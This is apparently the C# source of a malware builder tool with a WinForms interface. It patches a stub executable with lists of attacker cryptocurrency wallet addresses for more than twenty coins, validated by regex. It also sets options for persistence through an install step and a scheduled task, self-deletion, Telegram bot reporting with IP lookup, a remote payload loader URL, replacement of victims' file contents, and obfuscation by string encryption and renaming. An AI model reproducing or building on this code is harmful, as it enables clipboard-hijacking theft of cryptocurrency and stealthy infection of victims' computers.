using Builder.Plugins;
using Builder.RenamingObfuscation;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using Application = System.Windows.Forms.Application;
using System.Text.RegularExpressions;
using MetroFramework.Controls;

namespace Builder
{
    public partial class Form1 : Form
    {
        public static string buildicon = "";
        public static string pathProf = "";
        public static string keystring = "";
        public static string btc1 = "";
        public static string btc3 = "";
        public static string bc1 = "";
        public static string eth = "";
        public static string xmr4 = "";
        public static string xmr8 = "";
        public static string xlm = "";
        public static string xrp = "";
        public static string ltcm = "";
        public static string ltcltc1q = "";
        public static string ltcl = "";
        public static string nec = "";
        public static string bch = "";
        public static string dash = "";
        public static string doge = "";
        public static string trx = "";
        public static string zcash = "";
        public static string bnb = "";
        public static string ton = "";
        public static string sol = "";
        public static string dot = "";
        public static string avax = "";
        
        public static string tempFileICO;
        public static string tempProfile;
        public static string mutex;
        public Form1(string fileName)
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            mutex = Helpers.Random(16);
            keystring = Helpers.Random(16);
            metroComboBox1.SelectedIndex = 0;
            metroTextBox_FILES.Text = "*.txt,*.sql";
        }
        
        private void metroButton_BUILD_Click(object sender, EventArgs e)
        {
            metroButton_BUILD.Enabled = false;
            // Проверяем наличие стаба
            string stubexe = Path.Combine(Application.StartupPath, "Stub", "Stub.exe");
            if (!File.Exists(stubexe))
            {
                MessageBox.Show("Stub Not Found \n\t" + stubexe, "File Not Found", MessageBoxButtons.OK, MessageBoxIcon.Error);
                metroButton_BUILD.Enabled = true;
                return;
            }

            try
            {
                ModuleDefMD asmDef;
                using (asmDef = ModuleDefMD.Load(stubexe))
                using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
                {
                    saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
                    saveFileDialog1.InitialDirectory = Application.StartupPath;
                    saveFileDialog1.OverwritePrompt = true;
                    saveFileDialog1.FileName = "Build";
                    if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                    {
                        metroButton_BUILD.Enabled = false;
                        WriteSettings(asmDef, saveFileDialog1.FileName);
                        WriteSettingsgetinfo(asmDef, saveFileDialog1.FileName);

                        if (metroCheckBox3.Checked) 
                        {
                            EncryptString.DoEncrypt(asmDef);
                            Renaming.DoRenaming(asmDef);
                        }
                        
                        asmDef.Write(saveFileDialog1.FileName);
                        asmDef.Dispose();
                        Form1 formBuilt = new Form1(saveFileDialog1.FileName);
                        MessageBox.Show("✅ Build Created:\n" + saveFileDialog1.FileName + "\n", "Successfully", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                metroButton_BUILD.Text = "Build";
                metroButton_BUILD.Enabled = true;
            }
        }


        private void WriteSettingsgetinfo(ModuleDefMD asmDef, string AsmName)
        {
            try
            {
                foreach (TypeDef type in asmDef.Types)
                {
                    asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
                    asmDef.Name = Path.GetFileName(AsmName);
                    if (type.Name == "NativeMethods")
                        foreach (MethodDef method in type.Methods)
                        {
                            if (method.Body == null) continue;
                            for (int i = 0; i < method.Body.Instructions.Count(); i++)
                            {
                                if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                {
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BTC1]")
                                        method.Body.Instructions[i].Operand = Properties.Resources.btc1;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BTC3]")
                                        method.Body.Instructions[i].Operand = Properties.Resources.btc3;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BC1]")
                                        method.Body.Instructions[i].Operand = Properties.Resources.btcbc1;

                                    if (method.Body.Instructions[i].Operand.ToString() == "[ETH]")
                                        method.Body.Instructions[i].Operand = Properties.Resources.eth;

                                    if (method.Body.Instructions[i].Operand.ToString() == "[XMR_4]")
                                        method.Body.Instructions[i].Operand = Properties.Resources.xmr4;

                                    if (method.Body.Instructions[i].Operand.ToString() == "[XMR_8]")
                                        method.Body.Instructions[i].Operand = Properties.Resources.xmr8;


                                    if (method.Body.Instructions[i].Operand.ToString() == "[XLM]")
                                        method.Body.Instructions[i].Operand = Properties.Resources.xml;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[XRP]")
                                        method.Body.Instructions[i].Operand = Properties.Resources.ripple_xrp;

                                    if (method.Body.Instructions[i].Operand.ToString() == "[LTC_L]")
                                        method.Body.Instructions[i].Operand = Properties.Resources.ltc_l;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[LTC_M]")
                                        method.Body.Instructions[i].Operand = Properties.Resources.ltc_m;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[LTC_ltc1q]")
                                        method.Body.Instructions[i].Operand = Properties.Resources.ltc_ltc1q;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[NEC]")
                                        method.Body.Instructions[i].Operand = Properties.Resources.neocoin_nec;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BCH]")
                                        method.Body.Instructions[i].Operand = Properties.Resources.bch;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[DASH]")
                                        method.Body.Instructions[i].Operand = Properties.Resources.dash;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[DOGE]")
                                        method.Body.Instructions[i].Operand = Properties.Resources.doge;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[TRX]")
                                        method.Body.Instructions[i].Operand = Properties.Resources.tron;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[ZCASH]")
                                        method.Body.Instructions[i].Operand = Properties.Resources.zcash;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BNB]")
                                        method.Body.Instructions[i].Operand = Properties.Resources.bnb;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[TON]")
                                        method.Body.Instructions[i].Operand = Properties.Resources.ton;

                                    if (method.Body.Instructions[i].Operand.ToString() == "[SOL]")
                                        method.Body.Instructions[i].Operand = Properties.Resources.sol;

                                    if (method.Body.Instructions[i].Operand.ToString() == "[DOT]")
                                        method.Body.Instructions[i].Operand = Properties.Resources.dot;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[AVAX]")
                                        method.Body.Instructions[i].Operand = Properties.Resources.avax;
                                }
                            }
                        }
                }
            }
            catch (Exception ex)
            {
                throw new ArgumentException("WriteSettings Error: " + ex.Message);
            }

        }

        // Записываем настройки в STUB
        private void WriteSettings(ModuleDefMD asmDef, string AsmName)
        {
            try
            {
                foreach (TypeDef type in asmDef.Types)
                {
                    asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
                    asmDef.Name = Path.GetFileName(AsmName);
                    if (type.Name == "Config")
                        foreach (MethodDef method in type.Methods)
                        {
                            if (method.Body == null) continue;
                            for (int i = 0; i < method.Body.Instructions.Count(); i++)
                            {
                                if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                {
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BTC1]")
                                        method.Body.Instructions[i].Operand = btc1;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BTC3]")
                                        method.Body.Instructions[i].Operand = btc3;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BC1]")
                                        method.Body.Instructions[i].Operand = bc1;

                                    if (method.Body.Instructions[i].Operand.ToString() == "[ETH]")
                                        method.Body.Instructions[i].Operand = eth;

                                    if (method.Body.Instructions[i].Operand.ToString() == "[XMR_4]")
                                        method.Body.Instructions[i].Operand = xmr4;

                                    if (method.Body.Instructions[i].Operand.ToString() == "[XMR_8]")
                                        method.Body.Instructions[i].Operand = xmr8;


                                    if (method.Body.Instructions[i].Operand.ToString() == "[XLM]")
                                        method.Body.Instructions[i].Operand = xlm;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[XRP]")
                                        method.Body.Instructions[i].Operand = xrp;

                                    if (method.Body.Instructions[i].Operand.ToString() == "[LTC_L]")
                                        method.Body.Instructions[i].Operand = ltcl;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[LTC_M]")
                                        method.Body.Instructions[i].Operand = ltcm;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[LTC_ltc1q]")
                                        method.Body.Instructions[i].Operand = ltcltc1q;


                                    if (method.Body.Instructions[i].Operand.ToString() == "[NEC]")
                                        method.Body.Instructions[i].Operand = nec;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BCH]")
                                        method.Body.Instructions[i].Operand = bch;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[DASH]")
                                        method.Body.Instructions[i].Operand = dash;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[DOGE]")
                                        method.Body.Instructions[i].Operand = doge;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[TRX]")
                                        method.Body.Instructions[i].Operand = trx;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[ZCASH]")
                                        method.Body.Instructions[i].Operand = zcash;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BNB]")
                                        method.Body.Instructions[i].Operand = bnb;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[TON]")
                                        method.Body.Instructions[i].Operand = ton;

                                    if (method.Body.Instructions[i].Operand.ToString() == "[SOL]")
                                        method.Body.Instructions[i].Operand = sol;

                                    if (method.Body.Instructions[i].Operand.ToString() == "[DOT]")
                                        method.Body.Instructions[i].Operand = dot;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[AVAX]")
                                        method.Body.Instructions[i].Operand = avax;
                                    

                                    if (metroToggle_Install.Checked)
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[INSTALL]")
                                            method.Body.Instructions[i].Operand = "true";
                                    }
                                    else
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[INSTALL]")
                                            method.Body.Instructions[i].Operand = "false";
                                    }

                                    if (metroToggle_AutoRun_Scheduler.Checked)
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[RUN_SCHEDULER]")
                                            method.Body.Instructions[i].Operand = "true";
                                    }
                                    else
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[RUN_SCHEDULER]")
                                            method.Body.Instructions[i].Operand = "false";
                                    }

                                    if (metroToggle_Run_COM.Checked)
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[RUN_COM]")
                                            method.Body.Instructions[i].Operand = "true";
                                    }
                                    else
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[RUN_COM]")
                                            method.Body.Instructions[i].Operand = "false";
                                    }

                                    if (metroToggle_Delete_Source_File.Checked)
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[DELETE]")
                                            method.Body.Instructions[i].Operand = "true";
                                    }
                                    else
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[DELETE]")
                                            method.Body.Instructions[i].Operand = "false";
                                    }

                                    if (method.Body.Instructions[i].Operand.ToString() == "[SYSDIR]")
                                        method.Body.Instructions[i].Operand = metroComboBox1.SelectedIndex.ToString();


                                    if (method.Body.Instructions[i].Operand.ToString() == "[DIR]")
                                        method.Body.Instructions[i].Operand = txt_build_dir.Text;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BIN]")
                                        method.Body.Instructions[i].Operand = txt_build_name.Text;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[TASKNAME]")
                                        method.Body.Instructions[i].Operand = txt_build_dir.Text;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[MUTEX]")
                                        method.Body.Instructions[i].Operand = mutex;


                                    if (metroToggle7.Checked)
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[FILES]")
                                            method.Body.Instructions[i].Operand = metroTextBox_FILES.Text;

                                        if (method.Body.Instructions[i].Operand.ToString() == "[FILE_REPLACER]")
                                            method.Body.Instructions[i].Operand = "true";
                                    }
                                    else
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[FILES]")
                                            method.Body.Instructions[i].Operand = "";

                                        if (method.Body.Instructions[i].Operand.ToString() == "[FILE_REPLACER]")
                                            method.Body.Instructions[i].Operand = "false";
                                    }

                                    if (metroCheckBox_TGAPI.Checked)
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[TOKEN]")
                                            method.Body.Instructions[i].Operand = metroTextBox2.Text;
                                        if (method.Body.Instructions[i].Operand.ToString() == "[USER_ID]")
                                            method.Body.Instructions[i].Operand = metroTextBox3.Text;

                                        if (method.Body.Instructions[i].Operand.ToString() == "[TG_API]")
                                            method.Body.Instructions[i].Operand = "true";

                                        if (get_ipinfo.Checked)
                                        {
                                            if (method.Body.Instructions[i].Operand.ToString() == "[GET_IP]")
                                                method.Body.Instructions[i].Operand = "true";
                                        }
                                        else
                                        {
                                            if (method.Body.Instructions[i].Operand.ToString() == "[GET_IP]")
                                                method.Body.Instructions[i].Operand = "false";
                                        }
                                    }
                                    else
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[TOKEN]")
                                            method.Body.Instructions[i].Operand = "";
                                        if (method.Body.Instructions[i].Operand.ToString() == "[USER_ID]")
                                            method.Body.Instructions[i].Operand = "";

                                        if (method.Body.Instructions[i].Operand.ToString() == "[TG_API]")
                                            method.Body.Instructions[i].Operand = "false";

                                        if (get_ipinfo.Checked)
                                        {
                                            if (method.Body.Instructions[i].Operand.ToString() == "[GET_IP]")
                                                method.Body.Instructions[i].Operand = "true";
                                        }
                                        else
                                        {
                                            if (method.Body.Instructions[i].Operand.ToString() == "[GET_IP]")
                                                method.Body.Instructions[i].Operand = "false";
                                        }
                                    }


                                    if (metroCheckBox1.Checked)
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[LOADER]")
                                            method.Body.Instructions[i].Operand = "true";
                                        if (method.Body.Instructions[i].Operand.ToString() == "[LOADER_URL]")
                                            method.Body.Instructions[i].Operand = metroTextBox1.Text;

                                    }
                                    else
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[LOADER]")
                                            method.Body.Instructions[i].Operand = "false";
                                        if (method.Body.Instructions[i].Operand.ToString() == "[LOADER_URL]")
                                            method.Body.Instructions[i].Operand = "";
                                    }

                                    
                                    if (metroCheckBox2.Checked)
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[API_GET]")
                                            method.Body.Instructions[i].Operand = "true";
                                        if (method.Body.Instructions[i].Operand.ToString() == "[API_URL]")
                                            method.Body.Instructions[i].Operand = metroTextBox4.Text;

                                    }
                                    else
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[API_GET]")
                                            method.Body.Instructions[i].Operand = "false";
                                        if (method.Body.Instructions[i].Operand.ToString() == "[API_URL]")
                                            method.Body.Instructions[i].Operand = "";
                                    }



                                    if (method.Body.Instructions[i].Operand.ToString() == "[ADDDBYTES]")
                                            method.Body.Instructions[i].Operand = "true";
                                        if (method.Body.Instructions[i].Operand.ToString() == "[ADDKB]")
                                            method.Body.Instructions[i].Operand = "750000";
                                }
                            }
                        }
                }
            }
            catch (Exception ex)
            {
                throw new ArgumentException("WriteSettings Error: " + ex.Message);
            }

        }
        
        private async Task ProcessFile(Button button)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Select *.txt file with addresses 1 per line...";
                ofd.Filter = ".txt (*.txt)|*.txt";
                ofd.Multiselect = false;

                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            List<string> lines = new List<string>();

                            int validLine = 0;
                            int noValidLine = 0;

                            using (StreamReader sr = new StreamReader(ofd.FileName))
                            {
                                string line;
                                while ((line = sr.ReadLine()) != null)
                                {
                                    if (button == addBTC_1)
                                    {
                                        if (Regex.IsMatch(line, @"\b[1][a-zA-HJ-NP-Z0-9]{26,35}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    if (button == ddBTC_3)
                                    {
                                        if (Regex.IsMatch(line, @"\b[3][a-zA-HJ-NP-Z0-9]{26,35}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    
                                    else if (button == addBC1)
                                    {
                                        if (Regex.IsMatch(line, @"\b[bc1][a-zA-HJ-NP-Z0-9]{35,41}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == AddETHWallets)
                                    {
                                        if (Regex.IsMatch(line, @"\b0x[a-fA-F0-9]{40}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == AddTRC20Wallets)
                                    {
                                        if (Regex.IsMatch(line, @"\bT[a-zA-Z0-9]{28,33}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == AddBCHWallets)
                                    {
                                        if (Regex.IsMatch(line, @"\b(bitcoincash:)?(q|p)[a-z0-9]{41}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == AddDOGEWallets)
                                    {
                                        if (Regex.IsMatch(line, @"\bD[a-km-zA-HJ-NP-Z1-9]{33}$\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == AddLTCWallets)
                                    {
                                        if (Regex.IsMatch(line, @"\bL[a-km-zA-HJ-NP-Z1-9]{26,33}\b")) // LTC (L)
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }

                                    else if (button == AddLTCWallets_m)
                                    {
                                        if (Regex.IsMatch(line, @"\bM[a-km-zA-HJ-NP-Z1-9]{26,33}\b")) // LTC (M)
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }

                                    else if (button == AddLTCWallets_ltc1q)
                                    {
                                        if (Regex.IsMatch(line, @"\bltc1q[a-z0-9]{6,86}\b")) // LTC (ltc1q)
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }

                                    else if (button == AddXMRWallets)
                                    {
                                        if (Regex.IsMatch(line, @"\b[4][0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }

                                    else if (button == AddXMRWallets_8)
                                    {
                                        if (Regex.IsMatch(line, @"\b[8][0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }

                                    else if (button == AddXLMWallets)
                                    {
                                        if (Regex.IsMatch(line, @"\bG[0-9a-zA-Z]{55}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == AddXRPWallets)
                                    {
                                        if (Regex.IsMatch(line, @"\br[0-9a-zA-Z]{24,34}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == AddNECWallets)
                                    {
                                        if (Regex.IsMatch(line, @"\b[AN][0-9a-zA-Z]{33}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == AddDASHWallets)
                                    {
                                        if (Regex.IsMatch(line, @"\bX[1-9A-HJ-NP-Za-km-z]{33}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == AddZECWallets)
                                    {
                                        if (Regex.IsMatch(line, @"\bt1[0-9A-z]{33}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == AddBNBWallets)
                                    {
                                        if (Regex.IsMatch(line, @"\bbnb[a-z0-9]{39}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == AddTONWallets)
                                    {
                                        if (Regex.IsMatch(line, @"\b(UQ|EQ)[A-Za-z0-9_-]{46,48}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == addDOT)
                                    {
                                        if (Regex.IsMatch(line, @"\b1[1-9A-HJ-NP-Za-km-z]{47}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == addSOL)
                                    {
                                        if (Regex.IsMatch(line, @"\b[1-9A-HJ-NP-Za-km-z]{44}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == addAVAX)
                                    {
                                        if (Regex.IsMatch(line, @"\bX-avax1[a-z0-9]{38}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }

                                    //
                                }
                            }
                            if (lines.Count > 0)
                            {
                                if (button == addBTC_1)
                                {
                                    btc1 = string.Join("|", lines);
                                    MessageValide($"Bitcoin (1)", validLine, noValidLine);
                                }

                                if (button == ddBTC_3)
                                {
                                    btc3 = string.Join("|", lines);
                                    MessageValide($"Bitcoin (3)", validLine, noValidLine);
                                }

                                else if (button == addBC1)
                                {
                                    bc1 = string.Join("|", lines);
                                    MessageValide($"Bitcoin (bc1)", validLine, noValidLine);
                                }
                                else if (button == AddETHWallets)
                                {
                                    eth = string.Join("|", lines);
                                    MessageValide($"Ethereum - ERC20 (0x)", validLine, noValidLine);
                                }
                                else if (button == AddTRC20Wallets)
                                {
                                    trx = string.Join("|", lines);
                                    MessageValide($"Tron - TRC20 (T)", validLine, noValidLine);
                                }
                                else if (button == AddBCHWallets)
                                {
                                    bch = string.Join("|", lines);
                                    MessageValide($"Bitcoin Cash - BCH (bitcoincash:),(q|p)", validLine, noValidLine);
                                }
                                else if (button == AddDOGEWallets)
                                {
                                    doge = string.Join("|", lines);
                                    MessageValide($"Doge Coin (D)", validLine, noValidLine);
                                }
                                else if (button == AddLTCWallets)
                                {
                                    ltcl = string.Join("|", lines);
                                    MessageValide($"Lite Coin - LTC (L)", validLine, noValidLine);
                                }

                                else if (button == AddLTCWallets_m)
                                {
                                    ltcm = string.Join("|", lines);
                                    MessageValide($"Lite Coin - LTC (M)", validLine, noValidLine);
                                }

                                else if (button == AddLTCWallets_ltc1q)
                                {
                                    ltcltc1q = string.Join("|", lines);
                                    MessageValide($"Lite Coin - LTC (ltc1q)", validLine, noValidLine);
                                }


                                else if (button == AddXMRWallets)
                                {
                                    xmr4 = string.Join("|", lines);
                                    MessageValide($"Monero - XMR (4)", validLine, noValidLine);
                                }

                                else if (button == AddXMRWallets_8)
                                {
                                    xmr8 = string.Join("|", lines);
                                    MessageValide($"Monero - XMR (8)", validLine, noValidLine);
                                }


                                else if (button == AddXLMWallets)
                                {
                                    xlm = string.Join("|", lines);
                                    MessageValide($"Stellar - XLM (G)", validLine, noValidLine);
                                }
                                else if (button == AddXRPWallets)
                                {
                                    xrp = string.Join("|", lines);
                                    MessageValide($"Ripple - XRP (r)", validLine, noValidLine);
                                }
                                else if (button == AddNECWallets)
                                {
                                    nec = string.Join("|", lines);
                                    MessageValide($"Neo Coin - NEC (A|N)", validLine, noValidLine);
                                }
                                else if (button == AddDASHWallets)
                                {
                                    dash = string.Join("|", lines);
                                    MessageValide($"DASH (X)", validLine, noValidLine);
                                }
                                else if (button == AddZECWallets)
                                {
                                    zcash = string.Join("|", lines);
                                    MessageValide($"ZCash - ZEC(t1)", validLine, noValidLine);
                                }
                                else if (button == AddBNBWallets)
                                {
                                    bnb = string.Join("|", lines);
                                    MessageValide($"Binance Coin - BNB", validLine, noValidLine);
                                }
                                else if (button == AddTONWallets)
                                {
                                    ton = string.Join("|", lines);
                                    MessageValide($"TON Coin", validLine, noValidLine);
                                }
                                else if (button == addDOT)
                                {
                                    dot = string.Join("|", lines);
                                    MessageValide($"Polka DOT Coin", validLine, noValidLine);
                                }
                                else if (button == addSOL)
                                {
                                    sol = string.Join("|", lines);
                                    MessageValide($"Solana SOL", validLine, noValidLine);
                                }

                                else if (button == addAVAX)
                                {
                                    avax = string.Join("|", lines);
                                    MessageValide($"Avalanche (AVAX)", validLine, noValidLine);
                                }
                                this.Invoke((MethodInvoker)delegate
                                {
                                    int existingCountIndex = button.Text.IndexOf(" - [");
                                    if (existingCountIndex != -1)
                                    {

                                        textBox1.Text += button.Text.Substring(0, existingCountIndex) + $" - [{lines.Count}]\r\n";

                                       // button.Text = button.Text.Substring(0, existingCountIndex) + $" - [{lines.Count}]";
                                    }
                                    else
                                    {
                                        textBox1.Text += button.Text + $" - [{lines.Count}]\r\n";

                                        
                                    }
                                });


                            }
                            else
                            {
                                MessageBox.Show("Wallet's Not Found, 0 lines");
                            }
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show("An error occurred: " + ex.Message);
                        }
                    });
                }
            }
        }

        private void MessageValide(string wallets, int valide, int novalde)
        {
            MessageBox.Show($"✅ Added Valid {wallets} Address Strings: " + valide + "\n" + "❌ Not Valid Strings: " + novalde);
        }
        private async void addBTC31_Click(object sender, EventArgs e)
        {
            await ProcessFile(addBTC_1);
        }

        private async void addBTC_3_Click(object sender, EventArgs e)
        {
            await ProcessFile(ddBTC_3);
        }

        private async void addBC1_Click(object sender, EventArgs e)
        {
            await ProcessFile(addBC1);
        }

        private async void AddETHWallets_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddETHWallets);
        }
        private async void AddTRC20Wallets_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddTRC20Wallets);
        }

        private async void AddBCHWallets_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddBCHWallets);
        }

        private async void AddDOGEWallets_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddDOGEWallets);
        }

        private async void AddLTCWallets_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddLTCWallets);
        }

        private async void AddXMRWallets_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddXMRWallets);
        }

        private async void AddXLMWallets_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddXLMWallets);
        }

        private async void AddXRPWallets_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddXRPWallets);
        }

        private async void AddNECWallets_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddNECWallets);
        }

        private async void AddDASHWallets_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddDASHWallets);
        }

        private async void AddZECWallets_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddZECWallets);
        }

        private async void AddBNBWallets_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddBNBWallets);
        }

        private async void AddTONWallets_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddTONWallets);
        }

        private async void metroButton2_Click(object sender, EventArgs e)
        {
            await ProcessFile(addDOT);
        }

        private async void metroButton1_Click(object sender, EventArgs e)
        {
            await ProcessFile(addSOL);
        }

        private async void AddLTCWallets_m_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddLTCWallets_m);
        }

        private async void AddLTCWallets_ltc1q_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddLTCWallets_ltc1q);

        }

        private async void AddXMRWallets_8_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddXMRWallets_8);

        }

        private async void addAVAX_Click(object sender, EventArgs e)
        {
            await ProcessFile(addAVAX); 
        }

        private void metroToggle7_CheckedChanged(object sender, EventArgs e)
        {
            if (metroToggle7.Checked)
                metroTextBox_FILES.Enabled = true;
            else
                metroTextBox_FILES.Enabled = false;
        }

        public void ParsProfile(Button button, string wallets)
        {
            try
            {
                Invoke((MethodInvoker)delegate
                {
                    if (wallets != null && !string.IsNullOrEmpty(wallets.Trim()))
                    {
                        int existingCountIndex = button.Text.IndexOf(" - [");
                        if (existingCountIndex != -1)
                        {
                            button.Text = button.Text.Substring(0, existingCountIndex) + $" - [{wallets.Split('|').Length}]";
                        }
                        else
                        {
                            button.Text += $" - [{wallets.Split('|').Length}]";
                        }
                    }
                    // Добавьте этот блок else для предотвращения присваивания значения [1]
                    else
                    {
                        int existingCountIndex = button.Text.IndexOf(" - [");
                        if (existingCountIndex != -1)
                        {
                            button.Text = button.Text.Substring(0, existingCountIndex);
                        }
                    }
                });
            }
            catch (Exception ex)
            {
                MessageBox.Show("An error occurred: " + ex.Message);
            }
        }

        private void metroCheckBox_TGAPI_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox_TGAPI.Checked)
            {
                metroTextBox2.Enabled = true;
                metroTextBox3.Enabled = true;
            }
            else
            {
                metroTextBox2.Enabled = false;
                metroTextBox3.Enabled = false;
            }
        }

        private void metroButton3_Click(object sender, EventArgs e)
        {
            metroTextBox_FILES.Text = "*.txt,*.sql,*.py,*.js,*.php,*.db,*.log,*.logs,*.ch,*.html,*.cs,*.c,*.cpp,*.xml,*.bat,*.cmd";
        }

       
    }
}
